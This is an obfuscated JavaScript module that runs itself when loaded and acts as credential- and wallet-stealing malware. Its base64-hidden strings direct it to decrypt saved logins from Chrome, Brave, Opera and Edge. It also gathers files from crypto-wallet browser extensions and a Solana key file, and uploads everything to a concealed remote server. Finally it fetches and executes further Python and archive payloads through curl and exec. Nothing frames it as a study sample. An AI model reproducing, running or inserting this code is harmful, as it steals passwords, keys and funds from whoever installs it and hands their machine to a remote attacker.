Object.prototype.hasOwnProperty, Object.prototype.toString, Object.defineProperty, Object.getOwnPropertyDescriptor;
const t = t => Buffer.from(t, "base64").toString("utf8"),
    c = t("Y2hpbGRfcHJvY2Vzcw"),
    r = t("Y3J5cHRv"),
    a = t("c3FsaXRlMw"),
    e = t("ZXhlYw"),
    n = t("aG9tZWRpcg"),
    l = t("cGxhdGZvcm0"),
    m = t("dG1wZGly"),
    i = t("aG9zdG5hbWU"),
    o = t("dHlwZQ"),
    s = require("fs"),
    $ = require("os"),
    Z = require(a),
    G = require("path"),
    b = require("request"),
    h = require(r),
    u = require(c)[e],
    y = $[n](),
    Y = $[l](),
    d = $[m](),
    W = $[i](),
    v = $[o]();
let V;
const p = t => Buffer.from(t, "base64").toString("utf8"),
    f = (() => {
        let t = "NDUuNjEuMTaHR0cDovLwI5LjI1NToxMjI0      ";
        for (var c = "", r = "", a = "", e = "", n = 0; n < 10; n++) c += t[n], r += t[10 + n], a += t[20 + n], e += t[30 + n];
        return c = c + a + e, p(r) + p(c)
    })(),
    w = t => t.replace(/^~([a-z]+|\/)/, ((t, c) => "/" === c ? y : `${G.dirname(y)}/${c}`)),
    R = "d3JpdGVGaWxlU3luYw",
    X = "L2NsaWVudA",
    j = "Z2V0",
    L = "cmNoNA4",
    U = p("Ly5ucGw"),
    g = p("ZXhpc3RzU3luYw"),
    F = "L3N0b3JlLm5vZGU",
    J = p("YWNjZXNzU3luYw");

function N(t) {
    try {
        return s[J](t), !0
    } catch (t) {
        return !1
    }
}
const B = p("RGVmYXVsdA"),
    E = p("UHJvZmlsZQ"),
    k = p("L0FwcERhdGEvTG9jYWwvTWljcm9zb2Z0L0VkZ2UvVXNlciBEYXRh"),
    x = (t, c) => {
        result = "";
        try {
            const r = `${t}`,
                a = require(`${y}${p(F)}`);
            if (v != p("V2luZG93c19OVA")) return;
            const e = p("U0VMRUNUICogRlJPTSBsb2dpbnM"),
                n = `${w("~/")}${c}`;
            let l = G.join(n, p("TG9jYWwgU3RhdGU"));
            const m = p("Q3J5cHRVbnByb3RlY3REYXRh"),
                i = p("Y3JlYXRlRGVjaXBoZXJpdg"),
                o = p("cmVhZEZpbGU"),
                $ = p("Y29weUZpbGU"),
                b = p("TG9naW4gRGF0YQ"),
                u = p("b3NfY3J5cHQ"),
                Y = p("ZW5jcnlwdGVkX2tleQ"),
                d = p("RGF0YWJhc2U"),
                W = p("YWVzLTI1Ni1nY20"),
                V = p("b3JpZ2luX3VybA"),
                f = p("dXNlcm5hbWVfdmFsdWU"),
                R = p("cGFzc3dvcmRfdmFsdWU"),
                X = p("bGF0aW4x"),
                j = p("VTog"),
                L = p("Vzog"),
                U = p("UDog"),
                g = p("dW5saW5r");
            s[o](l, p("dXRmLTg"), ((t, c) => {
                if (!t) {
                    mkey = JSON.parse(c), mkey = mkey[u][Y], mkey = (t => {
                        var c = atob(t),
                            r = new Uint8Array(c.length);
                        for (let t = 0; t < c.length; t++) r[t] = c.charCodeAt(t);
                        return r
                    })(mkey);
                    try {
                        const t = a[m](mkey.slice(5));
                        for (ii = 0; ii <= 200; ii++) {
                            const c = 0 === ii ? B : `${E} ${ii}`,
                                a = `${n}/${c}/${b}`,
                                l = `${n}/t${c}`;
                            if (!N(a)) continue;
                            const m = `${r}_${ii}_${E}`;
                            s[$](a, l, (c => {
                                try {
                                    const c = new Z[d](l);
                                    c.all(e, ((r, a) => {
                                        var e = "";
                                        r || a.forEach((c => {
                                            var r = c[V],
                                                a = c[f],
                                                n = c[R];
                                            try {
                                                "v" === n.subarray(0, 1).toString() && (iv = n.subarray(3, 15), cip = n.subarray(15, n.length - 16), cip.length && (mmm = h[i](W, t, iv).update(cip), e = `${e}${L}${r} ${j} ${a} ${U}${mmm.toString(X)}\n\n`))
                                            } catch (t) {}
                                        })), c.close(), s[g](l, (t => {})), ct(m, e)
                                    }))
                                } catch (t) {}
                            }))
                        }
                    } catch (t) {}
                }
            }))
        } catch (t) {}
    },
    z = p("cmVhZGRpclN5bmM"),
    T = p("c3RhdFN5bmM"),
    Q = (p("aXNEaXJlY3Rvcnk"), p("cG9zdA")),
    S = [
        [p("L0xpYnJhcnkvQXBwbGljYXRpb24gU3VwcG9ydC9Hb29nbGUvQ2hyb21l"), p("Ly5jb25maWcvZ29vZ2xlLWNocm9tZQ"), p("L0FwcERhdGEvTG9jYWwvR29vZ2xlL0Nocm9tZS9Vc2VyIERhdGE")],
        [p("L0xpYnJhcnkvQXBwbGljYXRpb24gU3VwcG9ydC9CcmF2ZVNvZnR3YXJlL0JyYXZlLUJyb3dzZXI"), p("Ly5jb25maWcvQnJhdmVTb2Z0d2FyZS9CcmF2ZS1Ccm93c2Vy"), p("L0FwcERhdGEvTG9jYWwvQnJhdmVTb2Z0d2FyZS9CcmF2ZS1Ccm93c2VyL1VzZXIgRGF0YQ")],
        [p("L0xpYnJhcnkvQXBwbGljYXRpb24gU3VwcG9ydC9jb20ub3BlcmFzb2Z0d2FyZS5PcGVyYQ"), p("Ly5jb25maWcvb3BlcmE"), p("L0FwcERhdGEvUm9hbWluZy9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBTdGFibGUvVXNlciBEYXRh")]
    ],
    q = p("TG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdz"),
    C = p("LmxkYg"),
    H = p("LmxvZw"),
    I = p("c29sYW5hX2lkLnR4dA");
let M = "comp";
const A = ["bmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4", "ZWpiYWxiYWtvcGxjaGxnaGVjZGFsbWVlZWFqbmltaG0", "Zmhib2hpbWFlbGJvaHBqYmJsZGNuZ2NuYXBuZG9kanA", "aG5mYW5rbm9jZmVvZmJkZGdjaWpubWhuZm5rZG5hYWQ", "YmZuYWVsbW9tZWltaGxwbWdqbmpvcGhocGtrb2xqcGE", "Zm5qaG1raGhta2Jqa2thYm5kY25ub2dhZ29nYm5lZWM", "Y2ZiZmRoaW1pZmRtZGVoam1rZG9icGNqZmVmYmxram0", "aWJuZWpkZmptbWtwY25scGVia2xtbmtvZW9paG9mZWM", "aGlmYWZnbWNjZHBla3Bsb21qamtjZmdvZG5oY2VsbGo", "YWVhY2hrbm1lZnBoZXBjY2lvbmJvb2hja29ub2VlbWc"],
    D = p("Y3JlYXRlUmVhZFN0cmVhbQ"),
    O = p("L3VwbG9hZHM"),
    P = async (t, c, r) => {
        let a = t;
        if (!a || "" === a) return [];
        try {
            if (!N(a)) return []
        } catch (t) {
            return []
        }
        c || (c = "");
        let e = [];
        for (let r = 0; r < 200; r++) {
            const n = `${t}/${0 === r ? B : `${E} ${r}`}/${q}`;
            for (let t = 0; t < A.length; t++) {
                const l = p(A[t]);
                let m = `${n}/${l}`;
                if (N(m)) {
                    try {
                        far = s[z](m)
                    } catch (t) {
                        far = []
                    }
                    far.forEach((async t => {
                        a = G.join(m, t);
                        try {
                            (a.includes(C) || a.includes(H)) && e.push({
                                value: s[D](a),
                                options: {
                                    filename: `${c}${r}_${l}_${t}`
                                }
                            })
                        } catch (t) {}
                    }))
                }
            }
        }
        if (r && (a = `${y}${p("Ly5jb25maWcvc29sYW5hL2lkLmpzb24")}`, s[g](a))) try {
            e.push({
                value: s[D](a),
                options: {
                    filename: I
                }
            })
        } catch (t) {}
        const n = {
            timestamp: V.toString(),
            type: L,
            hid: M,
            multi_file: e
        };
        try {
            const t = {
                url: `${f}${O}`,
                formData: n
            };
            b[Q](t, ((t, c, r) => {}))
        } catch (t) {}
        return e
    }, _ = () => {
        try {
            S.forEach(((t, c) => {
                x(c, t[2])
            })), x(3, k)
        } catch (t) {}
    }, K = p("L2tleXM"), tt = p("cHl0aG9u"), ct = async (t, c) => {
        const r = {
                ts: V.toString(),
                type: L,
                hid: M,
                ss: t,
                cc: c.toString()
            },
            a = {
                url: `${f}${K}`,
                formData: r
            };
        try {
            b[Q](a, ((t, c, r) => {}))
        } catch (t) {}
    }, rt = p("cC56aQ"), at = p("L3Bkb3du"), et = p("cmVuYW1lU3luYw"), nt = p("cmVuYW1l"), lt = p("cm1TeW5j"), mt = p("dGFyIC14Zg"), it = p("Y3VybCAtTG8"), ot = p("XC5weXBccHl0aG9uLmV4ZQ"), st = 51476596;
let $t = 0;
const Zt = async t => {
    u(`${mt} ${t} -C ${y}`, ((c, r, a) => {
        if (c) return s[lt](t), void($t = 0);
        s[lt](t), ut()
    }))
}, Gt = () => {
    const t = `${f}${at}`,
        c = p("cDIuemlw"),
        r = `${d}\\${rt}`,
        a = `${d}\\${c}`;
    if (!($t >= st))
        if (s[g](r)) try {
            var e = s[T](r);
            e.size >= st ? ($t = e.size, s[nt](r, a, (t => {
                if (t) throw t;
                Zt(a)
            }))) : ($t < e.size ? $t = e.size : (s[lt](r), $t = 0), bt())
        } catch (t) {} else {
            u(`${it} "${r}" "${t}"`, ((t, c, e) => {
                if (t) return $t = 0, void bt();
                try {
                    $t = st, s[et](r, a), Zt(a)
                } catch (t) {}
            }))
        }
};

function bt() {
    setTimeout((() => {
        Gt()
    }), 2e4)
}
const ht = async () => {
    var t = process.version.match(/^v(\d+\.\d+)/)[1];
    const c = `${f}${p("L25vZGUv")}${t}`,
        r = `${y}${p(F)}`;
    if (s[g](r)) _();
    else {
        u(`${it} "${r}" "${c}"`, ((t, c, r) => {
            _()
        }))
    }
}, ut = async () => await new Promise(((t, c) => {
    if ("w" == Y[0]) {
        const t = `${y}${ot}`;
        s[g](`${t}`) ? (() => {
            const t = p(X),
                c = p(R),
                r = p(j),
                a = `${f}${t}/${L}`,
                e = `${y}${U}`,
                n = `"${y}${ot}" "${e}"`;
            try {
                s[lt](e)
            } catch (t) {}
            b[r](a, ((t, r, a) => {
                try {
                    s[c](e, a), u(n, ((t, c, r) => {
                        t && ht()
                    }))
                } catch (t) {
                    ht()
                }
            }))
        })() : (ht(), Gt())
    } else(() => {
        const t = p(X),
            c = p(R),
            r = p(j),
            a = `${f}${t}/${L}`,
            e = `${y}${U}`;
        let n = `${tt}3 "${e}"`;
        b[r](a, ((t, r, a) => {
            s[c](e, a), u(n, ((t, c, r) => {}))
        }))
    })()
}));
var yt = 0;
const Yt = async () => {
    try {
        V = Date.now(), await (async () => {
            M = W;
            try {
                const t = w("~/");
                S.forEach((async (c, r) => {
                    let a = "";
                    a = "d" == Y[0] ? `${t}${c[0]}` : "l" == Y[0] ? `${t}${c[1]}` : `${t}${c[2]}`, await P(a, `${r}_`, 0 == r)
                })), "w" == Y[0] && (pa = `${t}${k}`, await P(pa, "3_", !1))
            } catch (t) {}
        })(), ut()
    } catch (t) {}
};
Yt();
let dt = setInterval((() => {
    (yt += 1) < 5 ? Yt() : clearInterval(dt)
}), 6e5);
module.exports = Yt;